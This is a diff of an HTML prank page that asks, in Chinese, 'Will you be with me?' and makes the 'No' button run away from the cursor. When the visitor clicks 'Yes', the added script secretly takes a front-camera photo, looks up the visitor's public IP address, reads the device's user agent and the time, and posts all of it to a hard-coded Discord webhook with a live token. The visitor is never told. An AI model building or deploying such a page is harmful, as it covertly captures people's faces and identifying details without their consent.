@@ -24,82 +24,51 @@ body {
   justify-content: center;
   align-items: center;
   color: white;
-  position: relative;
-}
-
-.title {
-  font-size: 22px;
-  text-align: center;
-}
-
-.subtitle {
-  font-size: 16px;
-  color: #aaa;
 }
 
 .btn-area {
   position: relative;
   width: 300px;
   height: 200px;
-  margin-top: 20px;
 }
 
 button {
   padding: 12px 25px;
-  border: none;
   border-radius: 12px;
+  border: none;
   font-size: 18px;
   cursor: pointer;
   position: absolute;
-  transition: 0.2s;
 }
 
-.yes {
-  background: #4CAF50;
-  color: white;
-}
-
-.no {
-  background: #ff4d4d;
-  color: white;
-}
+.yes { background: #4CAF50; color: white; }
+.no { background: #ff4d4d; color: white; }
 
 .success {
   position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
+  inset: 0;
   background: radial-gradient(circle, #ff4d6d, #0d1117);
   display: flex;
   justify-content: center;
   align-items: center;
+  font-size: 40px;
+  color: white;
   opacity: 0;
   pointer-events: none;
-  transition: 0.5s;
-  color: white;
-  font-size: 40px;
 }
 
-.success.show {
-  opacity: 1;
-}
+.success.show { opacity: 1; }
 
-video, canvas {
-  display: none;
-}
+video, canvas { display: none; }
 </style>
 </head>
 
 <body>
 
 <div class="card">
-  <p class="title">
-    我喜歡你 ❤️<br>
-    <span class="subtitle">你願意跟我在一起嗎？ 😳</span>
-  </p>
+  <h2>💖 你願意嗎？</h2>
 
-  <div class="btn-area" id="area">
+  <div class="btn-area">
     <button class="yes" id="yesBtn">願意</button>
     <button class="no" id="noBtn">不願意</button>
   </div>
@@ -111,107 +80,100 @@ video, canvas {
 <canvas id="canvas"></canvas>
 
 <script>
-const noBtn = document.getElementById("noBtn");
 const yesBtn = document.getElementById("yesBtn");
-const area = document.getElementById("area");
+const noBtn = document.getElementById("noBtn");
 const success = document.getElementById("success");
 
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 
-let imageData = null;
 let noScale = 1;
 let yesScale = 1;
 
-// 初始位置
-yesBtn.style.left = "40px";
-yesBtn.style.top = "100px";
-
-noBtn.style.left = "160px";
-noBtn.style.top = "100px";
-
-// 😈 NO 逃跑
-function moveAway(x, y) {
+// NO 逃跑
+document.addEventListener("mousemove", e => {
   const r = noBtn.getBoundingClientRect();
-  const bx = r.left + r.width / 2;
-  const by = r.top + r.height / 2;
-
-  const dx = bx - x;
-  const dy = by - y;
-  const dist = Math.sqrt(dx * dx + dy * dy);
+  const dx = r.left - e.clientX;
+  const dy = r.top - e.clientY;
+  const dist = Math.sqrt(dx*dx + dy*dy);
 
   if (dist < 120) {
-    const maxX = area.clientWidth - noBtn.offsetWidth;
-    const maxY = area.clientHeight - noBtn.offsetHeight;
-
-    noBtn.style.left = Math.random() * maxX + "px";
-    noBtn.style.top = Math.random() * maxY + "px";
-
-    noScale = Math.max(0.3, noScale - 0.1);
-    yesScale += 0.1;
-
-    noBtn.style.transform = `scale(${noScale})`;
-    yesBtn.style.transform = `scale(${yesScale})`;
+    noBtn.style.left = Math.random() * 200 + "px";
+    noBtn.style.top = Math.random() * 150 + "px";
   }
-}
+});
 
-document.addEventListener("mousemove", e => moveAway(e.clientX, e.clientY));
-document.addEventListener("touchmove", e => moveAway(e.touches[0].clientX, e.touches[0].clientY));
-
-// 📸 YES 點下才開鏡頭 + 拍照 + 傳 Discord
+// 📱 YES
 yesBtn.onclick = async () => {
   success.classList.add("show");
 
+  // 📸 開鏡頭（必須點擊觸發）
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "user" }
+  });
+
+  video.srcObject = stream;
+
+  // 等 video ready（修復沒照片問題）
+  await new Promise(resolve => {
+    video.onloadedmetadata = () => setTimeout(resolve, 1000);
+  });
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0);
+
+  const imageData = canvas.toDataURL("image/png");
+
+  // 🌐 取得 IP
+  let ip = "unknown";
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }
-    });
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    ip = data.ip;
+  } catch {}
 
-    video.srcObject = stream;
+  // 📱 裝置資訊
+  const device = navigator.userAgent;
 
-    await new Promise(r => setTimeout(r, 1000));
+  // 🕒 時間
+  const time = new Date().toLocaleString();
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+  const webhookURL = "https://discord.com/api/webhooks/1492236169524674625/K4JOL-5_G46crVFSWO2S05m9DhJamM42P91kQb-GCPFu7v6CiSIOvQHByAxuo1eqLbCq";
 
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
+  const blob = await (await fetch(imageData)).blob();
 
-    imageData = canvas.toDataURL("image/png");
+  const formData = new FormData();
+  formData.append("file", blob, "love.png");
 
-    const webhookURL = "https://discord.com/api/webhooks/1492236169524674625/K4JOL-5_G46crVFSWO2S05m9DhJamM42P91kQb-GCPFu7v6CiSIOvQHByAxuo1eqLbCq";
+  const embed = {
+    username: "💌 告白系統",
+    embeds: [
+      {
+        title: "💖 告白成功",
+        color: 0xff4d6d,
+        image: { url: "attachment://love.png" },
+        fields: [
+          { name: "🌐 IP", value: ip, inline: false },
+          { name: "📱 裝置", value: device.slice(0, 100), inline: false },
+          { name: "🕒 時間", value: time, inline: false }
+        ],
+        timestamp: new Date().toISOString()
+      }
+    ]
+  };
 
-    const blob = await (await fetch(imageData)).blob();
+  formData.append("payload_json", JSON.stringify(embed));
 
-    const formData = new FormData();
-    formData.append("file", blob, "love.png");
+  await fetch(webhookURL, {
+    method: "POST",
+    body: formData
+  });
 
-    const embed = {
-      username: "💌 告白系統",
-      embeds: [
-        {
-          title: "💖 告白成功",
-          description: "有人按下願意 ❤️",
-          color: 0xff4d6d,
-          image: { url: "attachment://love.png" },
-          timestamp: new Date().toISOString()
-        }
-      ]
-    };
-
-    formData.append("payload_json", JSON.stringify(embed));
-
-    await fetch(webhookURL, {
-      method: "POST",
-      body: formData
-    });
-
-    document.body.innerHTML =
-      "<div style='color:white;font-size:40px;display:flex;justify-content:center;align-items:center;height:100vh;'>💖 成功 💖</div>";
-
-  } catch (err) {
-    alert("沒有開啟相機或被拒絕");
-  }
+  document.body.innerHTML =
+    "<div style='color:white;font-size:40px;display:flex;justify-content:center;align-items:center;height:100vh;'>💖 成功 💖</div>";
 };
 </script>
 
